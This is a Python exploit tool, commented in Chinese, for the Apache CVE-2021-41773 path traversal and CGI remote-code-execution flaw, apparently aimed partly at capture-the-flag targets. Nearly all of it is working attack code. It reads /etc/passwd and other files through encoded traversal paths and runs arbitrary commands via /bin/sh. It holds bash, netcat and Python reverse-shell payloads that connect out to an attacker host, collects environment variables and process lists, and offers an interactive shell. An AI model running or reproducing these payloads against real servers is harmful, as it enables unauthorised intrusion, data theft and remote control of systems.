#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apache CVE-2021-41773 智能化漏洞利用脚本
Author: Security Team
Date: 2025-01-25
"""

import requests
import argparse
import sys
import base64
import time
from urllib.parse import urljoin, quote

class ApacheCVE2021_41773Exploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        # 可用的攻击路径
        self.traversal_paths = [
            '/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e',
            '/icons/..%2e..%2e..%2e..%2e',
            '/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e'
        ]
        
        self.rce_paths = [
            '/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh',
            '/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
        ]

    def test_vulnerability(self):
        """测试目标是否存在漏洞"""
        print(f"[*] 测试目标漏洞: {self.target_url}")
        
        for path in self.traversal_paths:
            try:
                test_url = f"{self.target_url}{path}/etc/passwd"
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    if 'root:' in content and '/bin/' in content:
                        print(f"[+] 发现路径遍历漏洞: {path}")
                        return path
                        
            except requests.RequestException:
                continue
        
        print("[-] 目标不存在CVE-2021-41773漏洞")
        return None

    def read_file(self, file_path, traversal_path=None):
        """读取指定文件"""
        if not traversal_path:
            traversal_path = self.test_vulnerability()
            if not traversal_path:
                return None
        
        try:
            full_url = f"{self.target_url}{traversal_path}{file_path}"
            response = self.session.get(full_url, timeout=10)
            
            if response.status_code == 200:
                return response.text
            else:
                return None
                
        except requests.RequestException:
            return None

    def execute_command(self, command):
        """执行系统命令"""
        print(f"[*] 尝试执行命令: {command}")
        
        for rce_path in self.rce_paths:
            try:
                full_url = f"{self.target_url}{rce_path}"
                payload = f"echo Content-Type: text/plain; echo; {command}"
                
                response = self.session.post(full_url, data=payload, timeout=10)
                
                if response.status_code == 200:
                    content = response.text
                    # 移除HTTP头部分
                    if '\n\n' in content:
                        result = content.split('\n\n', 1)[1]
                    else:
                        result = content
                    
                    if result.strip():
                        print(f"[+] 命令执行成功:")
                        print(result)
                        return result
                        
            except requests.RequestException:
                continue
        
        print("[-] 命令执行失败")
        return None

    def get_reverse_shell(self, lhost, lport):
        """获取反向shell"""
        print(f"[*] 尝试获取反向shell: {lhost}:{lport}")
        
        # 多种反向shell payload
        payloads = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"nc -e /bin/bash {lhost} {lport}",
            f"python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\""
        ]
        
        for payload in payloads:
            print(f"[*] 尝试payload: {payload[:50]}...")
            result = self.execute_command(payload)
            if result is not None:
                return True
        
        return False

    def search_flags(self):
        """搜索flag文件"""
        print("[*] 搜索flag文件...")
        
        # 常见flag位置
        flag_locations = [
            "/flag",
            "/flag.txt", 
            "/tmp/flag*",
            "/var/www/flag*",
            "/home/*/flag*",
            "/root/flag*"
        ]
        
        # 使用find命令搜索
        find_result = self.execute_command("find / -name '*flag*' 2>/dev/null")
        if find_result:
            print("[+] 找到的flag文件:")
            for line in find_result.split('\n'):
                if line.strip() and 'flag' in line.lower():
                    print(f"    {line.strip()}")
                    # 尝试读取文件内容
                    content = self.read_file(line.strip())
                    if content and 'flag' in content.lower():
                        print(f"[+] Flag内容: {content.strip()}")

    def system_info(self):
        """收集系统信息"""
        print("[*] 收集系统信息...")
        
        commands = {
            "系统版本": "uname -a",
            "当前用户": "id",
            "当前目录": "pwd", 
            "环境变量": "env",
            "网络配置": "ifconfig",
            "进程列表": "ps aux",
            "磁盘使用": "df -h"
        }
        
        for desc, cmd in commands.items():
            print(f"\n[*] {desc}:")
            result = self.execute_command(cmd)
            if result:
                print(result[:500] + "..." if len(result) > 500 else result)

    def interactive_shell(self):
        """交互式shell"""
        print("[*] 进入交互式shell模式 (输入 'exit' 退出)")
        
        while True:
            try:
                command = input("shell> ").strip()
                if command.lower() in ['exit', 'quit']:
                    break
                elif command:
                    self.execute_command(command)
            except KeyboardInterrupt:
                print("\n[*] 退出交互式shell")
                break

def main():
    parser = argparse.ArgumentParser(
        description='Apache CVE-2021-41773 智能化漏洞利用工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 基础漏洞测试
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --test
  
  # 读取文件
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --read /etc/passwd
  
  # 执行命令
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --cmd "id"
  
  # 搜索flag
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --flag
  
  # 获取反向shell
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --reverse 192.168.1.100 4444
  
  # 交互式shell
  python3 apache_cve_2021_41773_exploit.py -u http://target.com --shell
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    parser.add_argument('--test', action='store_true', help='测试漏洞存在性')
    parser.add_argument('--read', help='读取指定文件')
    parser.add_argument('--cmd', help='执行指定命令')
    parser.add_argument('--flag', action='store_true', help='搜索flag文件')
    parser.add_argument('--info', action='store_true', help='收集系统信息')
    parser.add_argument('--shell', action='store_true', help='交互式shell')
    parser.add_argument('--reverse', nargs=2, metavar=('HOST', 'PORT'), help='获取反向shell')
    
    args = parser.parse_args()
    
    exploit = ApacheCVE2021_41773Exploit(args.url)
    
    if args.test:
        result = exploit.test_vulnerability()
        if result:
            print(f"[+] 目标存在CVE-2021-41773漏洞，可用路径: {result}")
        sys.exit(0)
    
    # 首先测试漏洞
    if not exploit.test_vulnerability():
        print("[-] 目标不存在漏洞，退出")
        sys.exit(1)
    
    if args.read:
        content = exploit.read_file(args.read)
        if content:
            print(f"[+] 文件内容 ({args.read}):")
            print(content)
        else:
            print(f"[-] 无法读取文件: {args.read}")
    
    elif args.cmd:
        exploit.execute_command(args.cmd)
    
    elif args.flag:
        exploit.search_flags()
    
    elif args.info:
        exploit.system_info()
    
    elif args.reverse:
        host, port = args.reverse
        print(f"[*] 请在 {host}:{port} 上启动监听: nc -lvp {port}")
        input("[*] 按回车键继续...")
        exploit.get_reverse_shell(host, int(port))
    
    elif args.shell:
        exploit.interactive_shell()
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main() 